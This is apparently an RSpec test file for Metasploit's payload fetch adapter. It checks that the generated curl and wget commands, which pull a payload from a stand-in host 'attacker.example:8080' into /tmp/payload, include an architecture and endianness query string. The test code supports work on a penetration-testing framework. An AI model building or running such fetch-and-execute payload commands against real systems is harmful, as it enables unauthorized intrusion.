require 'spec_helper'
require 'tempfile'

RSpec.describe Msf::Payload::Adapter::Fetch do
  let(:harness_class) do
    Class.new do
      include Msf::Payload::Adapter::Fetch

      def initialize; end

      def fetch_protocol
        'HTTP'
      end

      def download_uri(_uri)
        'attacker.example:8080/payload_uri'
      end

      def _remote_destination
        '/tmp/payload'
      end

      def _execute_add(get_file_cmd)
        get_file_cmd
      end
    end
  end

  subject(:harness) { harness_class.new }

  # curl and wget both append the same dynamic-arch query string, and it must
  # stay byte-for-byte in sync with what #identify_arch
  # (lib/msf/core/payload/adapter/fetch/server/http.rb) expects to parse back out.
  shared_examples 'a dynamic-arch aware fetch command' do |method|
    it 'omits the arch/endian query string when dynamic_arch is false' do
      cmd = harness.public_send(method, 'payload_uri', false)
      expect(cmd).not_to include('?arch=')
    end

    it 'appends the exact arch/endian query string the fetch HTTP handler expects' do
      cmd = harness.public_send(method, 'payload_uri', true)
      expect(cmd).to include('?arch=$(uname -m)\&endian=$(printf %d \\\'$(head -c6 /bin/sh|tail -c1))')
    end

    it 'produces a shell fragment that resolves to a real arch/endian pair when executed' do
      cmd = harness.public_send(method, 'payload_uri', true)
      suffix = cmd[/\?arch=.*\)\)/]

      resolved = Tempfile.create('fetch_endian_probe') do |f|
        f.write("echo #{suffix}\n")
        f.flush
        `sh #{f.path}`.strip
      end

      expect(resolved).to match(/\A\?arch=\S+&endian=[12]\z/)

      query_string = resolved.sub(/\A\?/, '').split('&').each_with_object({}) do |pair, h|
        k, v = pair.split('=', 2)
        h[k] = v
      end
      expect(query_string['arch']).to eq(`uname -m`.strip)
    end
  end

  describe '#_generate_curl_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_curl_command
  end

  describe '#_generate_wget_command' do
    include_examples 'a dynamic-arch aware fetch command', :_generate_wget_command
  end
end
